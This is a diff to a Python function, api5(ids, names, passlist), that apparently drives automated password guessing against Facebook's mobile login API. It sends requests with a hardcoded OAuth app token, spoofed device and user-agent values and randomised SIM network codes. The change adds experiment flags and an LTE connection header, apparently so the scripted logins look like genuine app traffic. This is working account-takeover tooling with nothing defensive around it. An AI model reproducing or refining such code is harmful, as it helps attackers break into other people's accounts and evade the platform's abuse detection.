@@ -521,11 +521,14 @@ def api5(ids,names,passlist):
                                         'device_id':adid,
                                         "method": "auth.login",
                                         "fb_api_req_friendly_name": "authenticate",
+                                        "fb4a_shared_phone_cpl_experiment": 
+                                        "fb4a_shared_phone_nonce_cpl_at_risk_v3",
+                                        "fb4a_shared_phone_cpl_group": "enable_v3_at_risk",
                                         "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                 head = {
                                         'content-type':'application/x-www-form-urlencoded',
                                         'x-fb-sim-hni':str(random.randint(2e4, 5e4)),
-                                        'x-fb-connection-type':'unknown',
+                                        'x-fb-connection-type':'mobile.CTRadioAccessTechnologyLTE',
                                         'Authorization':'OAuth 6628568379|c1e620fa708a1d5696fb991c1bde5662',
                                         'user-agent':ua_string,
                                         'x-fb-net-hni':str(random.randint(2e4, 5e4)),
